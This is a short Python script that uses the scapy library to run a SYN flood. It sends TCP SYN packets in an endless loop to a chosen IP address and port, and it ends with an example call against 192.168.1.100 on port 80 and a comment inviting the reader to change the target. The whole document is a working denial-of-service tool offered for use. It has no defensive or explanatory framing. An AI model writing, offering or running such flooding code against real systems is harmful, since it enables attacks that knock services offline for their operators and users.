from scapy.all import *

def syn_flood(target_ip, target_port):
    ip = IP(dst=target_ip)
    syn = TCP(dport=target_port, flags="S")
    pkt = ip/syn
    send(pkt, loop=1, verbose=0)

# Example usage
syn_flood("192.168.1.100", 80)  # Change the target IP and port if needed
